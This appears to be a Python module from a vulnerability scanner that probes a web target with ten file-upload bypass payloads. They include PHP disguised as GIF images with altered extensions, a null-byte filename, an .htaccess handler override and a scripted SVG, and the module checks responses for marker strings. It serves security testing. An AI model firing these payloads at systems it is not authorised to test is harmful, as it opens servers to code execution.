"""File-upload bypass scanner.

Exercises the canonical ten file-upload bypass techniques (extension
double-extension, null byte, MIME mismatch, magic-byte mutation,
``.htaccess`` / ``web.config``-style uploads, polyglot file headers,
case folding, alternate parser quirks, Content-Type spoofing,
``.phar`` rename).  Each payload is sent via ``POST`` with multipart-like
body bytes; the scanner looks for server-side hints that the file was
accepted (e.g. the marker filename appearing in the response).
"""

from __future__ import annotations

import logging
from typing import Any, Dict, List, Tuple

from bugwolf.scanners import Finding, Scanner, make_finding


logger = logging.getLogger(__name__)


class FileUploadScanner(Scanner):
    name = "file-upload"
    bug_class = "unrestricted-upload"
    default_severity = "high"
    PAYLOADS: Tuple[str, ...] = (
        # (filename, body, claimed_mime, technique)
        ("shell.phtml",
         b"GIF89a;<?php echo BugWolfUploadPhtml; ?>",
         "image/gif", "phtml-extension"),
        ("shell.pHp",
         b"GIF89a;<?php echo BugWolfUploadCase; ?>",
         "image/gif", "case-folding"),
        ("shell.php\x00.jpg",
         b"GIF89a;<?php echo BugWolfUploadNull; ?>",
         "image/jpeg", "null-byte"),
        ("shell.jpg.php",
         b"GIF89a;<?php echo BugWolfUploadDouble; ?>",
         "image/jpeg", "double-extension"),
        ("shell.php5",
         b"GIF89a;<?php echo BugWolfUploadPhp5; ?>",
         "image/gif", "alt-handler-php5"),
        ("shell.phar",
         b"GIF89a;<?php echo BugWolfUploadPhar; ?>",
         "image/gif", "phar-rename"),
        (".htaccess",
         b"AddType application/x-httpd-php .gif\n",
         "text/plain", "htaccess-upload"),
        ("shell.jpg",
         b"GIF89a;<?php echo BugWolfUploadMime; ?>",
         "image/jpeg", "mime-mismatch"),
        ("shell.gif",
         b"\x47\x49\x46\x38\x39\x61BugWolfUploadMagic",
         "image/gif", "magic-only"),
        ("shell.svg",
         b"<svg xmlns='http://www.w3.org/2000/svg'>"
         b"<script>BugWolfUploadSvg</script></svg>",
         "image/svg+xml", "svg-xss"),
    )

    def scan(self, target: str, transport) -> List[Finding]:
        if transport is None:
            logger.warning("file-upload: transport is None; returning []")
            return []
        findings: List[Finding] = []
        for filename, body, claimed_mime, technique in self.PAYLOADS:
            boundary = "----bw" + str(abs(hash(filename)) % 99999)
            head = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; '
                f'filename="{filename}"\r\n'
                f"Content-Type: {claimed_mime}\r\n\r\n"
            ).encode("utf-8")
            tail = f"\r\n--{boundary}--\r\n".encode("utf-8")
            full = head + body + tail
            headers = {
                "Content-Type": f"multipart/form-data; boundary={boundary}",
            }
            try:
                resp: Dict[str, Any] = transport("POST", target,
                                                  headers=headers,
                                                  body=full.decode("latin-1"))
            except Exception as exc:
                logger.debug("upload: transport error: %s", exc)
                continue
            rbody = resp.get("body", "") or ""
            rheaders = resp.get("headers", {}) or {}
            blob = (rbody + "\n" +
                    "\n".join(f"{k}: {v}" for k, v in rheaders.items()))
            for marker in ("BugWolfUploadPhtml", "BugWolfUploadCase",
                           "BugWolfUploadNull", "BugWolfUploadDouble",
                           "BugWolfUploadPhp5", "BugWolfUploadPhar",
                           "BugWolfUploadMime", "BugWolfUploadMagic",
                           "BugWolfUploadSvg", "AddType"):
                if marker in blob:
                    findings.append(make_finding(
                        self,
                        target=target,
                        evidence=(f"upload technique {technique!r} accepted "
                                  f"(marker {marker!r})"),
                        severity="high",
                        detail={
                            "filename": filename,
                            "technique": technique,
                            "marker": marker,
                            "status": resp.get("status"),
                        },
                    ))
                    break
        return findings


__all__ = ["FileUploadScanner"]